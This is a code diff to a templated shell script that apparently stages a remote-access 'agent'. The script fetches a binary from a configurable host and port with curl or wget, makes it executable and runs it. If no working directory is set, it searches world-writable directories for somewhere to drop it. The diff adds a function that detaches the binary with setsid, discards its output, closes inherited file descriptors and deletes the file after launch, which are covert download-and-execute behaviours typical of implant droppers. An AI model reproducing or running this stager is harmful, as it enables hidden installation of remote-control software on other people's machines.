@@ -5,22 +5,34 @@ export PATH="$PATH:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/sbin"
 
 download () {
 
-    if command -v curl &> /dev/null; then
+    if command -v curl >/dev/null 2>&1; then
         curl {{shq (printf "%s://%s:%s/%s" .Protocol .Host .Port .Name)}} -o "$1"/{{shq .Name}}
-    elif command -v  wget &> /dev/null; then
+    elif command -v  wget >/dev/null 2>&1; then
         wget -O "$1"/{{shq .Name}} {{shq (printf "%s://%s:%s/%s" .Protocol .Host .Port .Name)}}
     fi
 
     chmod +x "$1"/{{shq .Name}}
 }
 
+run_agent () {
+    agent_path="$1"
+
+    if command -v setsid >/dev/null 2>&1 && command -v bash >/dev/null 2>&1; then
+        setsid -f -- bash -c '(agent_path=$1; exec </dev/null >/dev/null 2>&1; for f in /proc/$$/fd/*; do n=${f##*/}; ((n>2)) && eval "exec $n>&-"; done; "$agent_path"; rm -f "$agent_path") & exit 0' bash "$agent_path"
+        return $?
+    fi
+
+    "$agent_path"
+    status=$?
+    rm -f "$agent_path"
+    return "$status"
+}
+
 {{if .WorkingDirectory}}
 
 download {{shq .WorkingDirectory}}
 
-{{shq .WorkingDirectory}}/{{shq .Name}}
-
-rm {{shq .WorkingDirectory}}/{{shq .Name}}
+run_agent {{shq .WorkingDirectory}}/{{shq .Name}}
 
 {{else}}
 
@@ -32,11 +44,9 @@ for i in "~" "." $(find / -maxdepth 3 -type d \( -perm -o+w \)); do
 
     download "$i"
 
-    if ! "$i"/{{shq .Name}}; then 
+    if ! run_agent "$i"/{{shq .Name}}; then
         continue
     fi
-
-    rm "$i"/{{shq .Name}}
 
     break
 done
